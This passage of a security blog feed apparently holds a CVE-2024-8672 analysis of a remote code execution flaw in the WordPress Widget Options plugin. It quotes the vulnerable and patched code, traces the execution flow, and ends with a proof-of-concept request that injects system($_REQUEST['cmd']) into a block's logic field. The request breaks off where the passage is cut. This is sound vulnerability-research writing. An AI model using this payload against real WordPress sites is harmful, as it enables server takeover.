if not properly controlled, can become an entry point for RCE.&lt;/li&gt;&#xA;&lt;li&gt;Always validate, sanitize, and strictly restrict allowed characters in input parameters.&lt;/li&gt;&#xA;&lt;li&gt;Use a parser or dedicated handler instead of directly executing dynamic expressions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://vdp.patchstack.com/database/wordpress/plugin/metalpriceapi/vulnerability/wordpress-metalpriceapi-1-1-4-remote-code-execution-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MetalpriceAPI Plugin &amp;lt;= 1.1.4 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-8672 Analysis &amp; PoC</title>
      <link>http://localhost:1313/posts/2025-12-04-cve-2024-8672/</link>
      <pubDate>Thu, 04 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-04-cve-2024-8672/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;The Widget Options – The #1 WordPress Widget &amp;amp; Block Control Plugin&lt;/strong&gt; for WordPress contains a &lt;strong&gt;Remote Code Execution&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;4.0.7&lt;/strong&gt; via the &lt;strong&gt;display logic&lt;/strong&gt; feature extended for multiple &lt;strong&gt;page builders&lt;/strong&gt;, because the plugin allows input to pass through &lt;strong&gt;eval()&lt;/strong&gt; without filtering or capability checks, allowing an authenticated attacker with &lt;strong&gt;contributor-level access&lt;/strong&gt; or higher to execute code on the server; although it has been &lt;strong&gt;patched&lt;/strong&gt;, the issue still leaves residual risk as it has not been fully hardened.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-8672&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-8672&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/widget-options/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Options Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Widget Options&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.3&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v4.0.7):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widgetopts_safe_eval($expression)&#xA;{&#xA;    ob_start();&#xA;    try {&#xA;        $result = (bool) eval(&amp;#34;return $expression;&amp;#34;);&#xA;    } catch (Throwable $e) {&#xA;        return false;&#xA;    }&#xA;    ob_end_clean();&#xA;&#xA;    return $result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The vulnerability originates from the &lt;code&gt;widgetopts_safe_eval&lt;/code&gt; function, which allows execution of arbitrary commands via &lt;code&gt;eval&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v4.1.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widgetopts_safe_eval($expression)&#xA;{&#xA;    if (widgetopts_is_widget_or_post_preview()) {&#xA;        // Always return true for previews unless the user is an administrator&#xA;        if (!current_user_can(&amp;#39;administrator&amp;#39;)) {&#xA;            return true;&#xA;        }&#xA;    }&#xA;&#xA;    $validation_result = widgetopts_validate_expression($expression);&#xA;&#xA;    if ($validation_result[&amp;#39;valid&amp;#39;] === false) {&#xA;        return false;&#xA;    }&#xA;&#xA;    if (stristr($expression, &amp;#34;return&amp;#34;) === false) {&#xA;        $expression = &amp;#34;return (&amp;#34; . $expression . &amp;#34;);&amp;#34;;&#xA;    }&#xA;&#xA;    ob_start();&#xA;    try {&#xA;        $result = (bool) (@eval($expression));&#xA;    } catch (\Exception $e) {&#xA;        $result = false;&#xA;    } catch (\Error $e) {&#xA;        $result = false;&#xA;    } catch (\ParseError $e) {&#xA;        $result = false;&#xA;    } catch (\Throwable $e) {&#xA;        $result = false;&#xA;    }&#xA;    ob_end_clean();&#xA;&#xA;    return $result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch validates &lt;code&gt;$expression&lt;/code&gt; by calling the function &lt;code&gt;widgetopts_validate_expression&lt;/code&gt;&#xA;(&lt;a href=&#34;https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534&lt;/a&gt;)&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;This plugin registers a &lt;strong&gt;filter hook&lt;/strong&gt; on &lt;code&gt;render_block&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter(&amp;#39;render_block&amp;#39;, function ($block_content, $parsed_block, $obj) {&#xA;    if (!is_admin()) {&#xA;        add_filter(&amp;#34;render_block_{$obj-&amp;gt;name}&amp;#34;, &amp;#34;blockopts_filter_before_display&amp;#34;, 100, 3);&#xA;    }&#xA;    return $block_content;&#xA;}, 100, 3);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;The &lt;code&gt;render_block&lt;/code&gt; hook is triggered every time a block is rendered in the &lt;strong&gt;WordPress default editor (Gutenberg)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If not in the admin environment (&lt;code&gt;!is_admin()&lt;/code&gt;), the plugin attaches an additional filter for the current block (&lt;code&gt;render_block_{block_name}&lt;/code&gt;) to process the content before displaying it, via the function &lt;code&gt;blockopts_filter_before_display&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function blockopts_filter_before_display($block_content, $parsed_block, $obj)&#xA;{&#xA;    ...&#xA;    if (isset($parsed_block) &amp;amp;&amp;amp; isset($parsed_block[&amp;#39;attrs&amp;#39;]) &amp;amp;&amp;amp; (isset($parsed_block[&amp;#39;attrs&amp;#39;][&amp;#39;extended_widget_opts&amp;#39;]) || isset($parsed_block[&amp;#39;attrs&amp;#39;][&amp;#39;extended_widget_opts_block&amp;#39;]))) {&#xA;        ...&#xA;        if (&amp;#39;activate&amp;#39; == $widget_options[&amp;#39;logic&amp;#39;]) {&#xA;&#x9;&#x9;&#x9;// display widget logic&#xA;&#x9;&#x9;&#x9;if (isset($opts[&amp;#39;class&amp;#39;]) &amp;amp;&amp;amp; isset($opts[&amp;#39;class&amp;#39;][&amp;#39;logic&amp;#39;]) &amp;amp;&amp;amp; !empty($opts[&amp;#39;class&amp;#39;][&amp;#39;logic&amp;#39;])) {&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = stripslashes(trim($opts[&amp;#39;class&amp;#39;][&amp;#39;logic&amp;#39;]));&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = apply_filters(&amp;#39;widget_options_logic_override_block&amp;#39;, $display_logic);&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = apply_filters(&amp;#39;extended_widget_options_logic_override_block&amp;#39;, $display_logic);&#xA;&#x9;&#x9;&#x9;&#x9;if ($display_logic === false) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;return false;&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;if ($display_logic === true) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;return true;&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;// if (stristr($display_logic, &amp;#34;return&amp;#34;) === false) {&#xA;&#x9;&#x9;&#x9;&#x9;// &#x9;$display_logic = &amp;#34;return (&amp;#34; . $display_logic . &amp;#34;);&amp;#34;;&#xA;&#x9;&#x9;&#x9;&#x9;// }&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = htmlspecialchars_decode($display_logic, ENT_QUOTES);&#xA;&#x9;&#x9;&#x9;&#x9;if (!widgetopts_safe_eval($display_logic)) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;return false;&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Line 4 checks whether &lt;code&gt;Gutenberg Page &amp;amp; Post Block Options&lt;/code&gt; is enabled; we enable it in the Admin Dashboard.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/enable.png&#34; title=&#34;Enable Gutenberg Page &amp;amp; Post Block Options&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;enable&lt;/h2&gt;&lt;p&gt;Enable Gutenberg Page &amp;amp; Post Block Options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/enable.png&#39; alt=&#34;enable&#34; height=&#34;670&#34; width=&#34;1676&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable Gutenberg Page &amp; Post Block Options&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;On line 6 and line 8, the code checks whether the &lt;strong&gt;logic&lt;/strong&gt; field exists and is not empty. If this condition is met, the function &lt;code&gt;widgetopts_safe_eval($display_logic)&lt;/code&gt; is called, resulting in the execution of any command passed into it.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/logic.png&#34; title=&#34;Logic field when submitting a post&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/logic.png&#34; data-sub-html=&#34;&lt;h2&gt;Logic&lt;/h2&gt;&lt;p&gt;Logic field when submitting a post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/logic.png&#39; alt=&#34;Logic&#34; height=&#34;723&#34; width=&#34;774&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Logic field when submitting a post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Here, when using a &lt;strong&gt;Contributor&lt;/strong&gt; account to create a post, the logic field appears in the request with the value set as a &lt;code&gt;payload&lt;/code&gt;. We can fully control this field.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker has a Contributor (or higher) account&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Creates or edits a post using Gutenberg&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Inserts malicious PHP into the &amp;#39;Logic&amp;#39; field (extended_widget_opts)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Payload is saved in block attributes&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;render_block hook is triggered&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;blockopts_filter_before_display() is executed&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;widgetopts_safe_eval() is called&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;eval() executes the attacker’s payload&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Remote Code Execution on the server&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Using an Administrator account, enable the option &lt;strong&gt;Gutenberg Page &amp;amp; Post Block Options&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Create a post with a Contributor account:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /index.php/wp-json/wp/v2/posts/170?_locale=user&amp;amp;cmd=ls&amp;#43;/ HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;{&amp;#34;id&amp;#34;:170,&amp;#34;title&amp;#34;:&amp;#34;testing&amp;#34;,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!-- wp:paragraph {\&amp;#34;atts\&amp;#34;:{\&amp;#34;id_base\&amp;#34;:-1,\&amp;#34;column\&amp;#34;:{\&amp;#34;desktop\&amp;#34;:\&amp;#34;12\&amp;#34;,\&amp;#34;tablet\&amp;#34;:\&amp;#34;12\&amp;#34;,\&amp;#34;mobile\&amp;#34;:\&amp;#34;12\&amp;#34;},\&amp;#34;alignment\&amp;#34;:{\&amp;#34;desktop\&amp;#34;:\&amp;#34;default\&amp;#34;,\&amp;#34;tablet\&amp;#34;:\&amp;#34;default\&amp;#34;,\&amp;#34;mobile\&amp;#34;:\&amp;#34;default\&amp;#34;},\&amp;#34;roles\&amp;#34;:{\&amp;#34;state\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;visibility\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;acf\&amp;#34;:{\&amp;#34;visibility\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;field\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;condition\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;value\&amp;#34;:\&amp;#34;\&amp;#34;}},\&amp;#34;author_page\&amp;#34;:{\&amp;#34;author_pages\&amp;#34;:{\&amp;#34;selections\&amp;#34;:\&amp;#34;1\&amp;#34;}},\&amp;#34;devices\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;days\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;dates\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;from\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;to\&amp;#34;:\&amp;#34;\&amp;#34;},\&amp;#34;styling\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;bg_image\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;heading\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;links\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;links_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_submit_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;list_border_color\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;table_border_color\&amp;#34;:\&amp;#34;\&amp;#34;},\&amp;#34;class\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;link\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;id\&amp;#34;:\&amp;#34;a\&amp;#34;,\&amp;#34;classes\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;animation\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;event\&amp;#34;:\&amp;#34;enters\&amp;#34;,\&amp;#34;speed\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;offset\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;delay\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;logic\&amp;#34;:\&amp;#34;system($_REQUEST[\&amp;#34;cmd\&amp;#34;])\&amp;#34;},\&amp;#34;tabselect\&amp;#3